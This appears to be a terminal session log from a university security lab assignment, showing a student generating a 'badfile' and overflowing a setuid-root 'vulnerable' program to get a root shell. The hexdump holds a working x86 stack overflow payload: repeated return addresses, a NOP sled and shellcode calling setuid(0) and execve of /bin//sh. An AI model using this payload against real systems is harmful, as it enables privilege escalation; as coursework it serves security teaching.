@@ -1,0 +1,29 @@
+Script started on 2020-05-03 15:34:18-0400
+]0;osboxes@osboxes: ~/Documents/csci-461-spring-2020/PA2[01;32mosboxes@osboxes[00m:[01;34m~/Documents/csci-461-spring-2020/PA2[00m$ ./createBadFile 
+]0;osboxes@osboxes: ~/Documents/csci-461-spring-2020/PA2[01;32mosboxes@osboxes[00m:[01;34m~/Documents/csci-461-spring-2020/PA2[00m$ hexdump -[K-0[KC badfile 
+00000000  80 ee ff bf 80 ee ff bf  80 ee ff bf 80 ee ff bf  |................|
+*
+00000080  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+00000090  31 c0 31 db b0 d5 cd 80  31 c0 50 68 2f 2f 73 68  |1.1.....1.Ph//sh|
+000000a0  68 2f 62 69 6e 89 e3 50  53 89 e1 99 b0 0b cd 80  |h/bin..PS.......|
+000000b0  00 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+000000c0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+*
+00000205
+]0;osboxes@osboxes: ~/Documents/csci-461-spring-2020/PA2[01;32mosboxes@osboxes[00m:[01;34m~/Documents/csci-461-spring-2020/PA2[00m$ ./vulnerable 
+# id
+uid=0(root) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lpadmin),128(sambashare)
+# ls -l
+total 36
+-rw-rw-r-- 1 osboxes osboxes   449 May  3 15:29 addresses
+-rw-r--r-- 1 osboxes osboxes   517 May  3 15:34 badfile
+-rw-r--r-- 1 osboxes osboxes     0 May  3 15:34 buffer1.txt
+-rwxr-xr-x 1 osboxes osboxes  7456 May  3 15:25 createBadFile
+-rw-rw-r-- 1 osboxes osboxes  1502 May  3 15:25 createBadFile.c
+-rwsr-xr-x 1 root    osboxes 10056 May  3 14:15 vulnerable
+-rw-rw-r-- 1 osboxes osboxes   582 May  3 00:05 vulnerable_program.c
+# exit
+]0;osboxes@osboxes: ~/Documents/csci-461-spring-2020/PA2[01;32mosboxes@osboxes[00m:[01;34m~/Documents/csci-461-spring-2020/PA2[00m$ exit
+exit
+
+Script done on 2020-05-03 15:35:02-0400
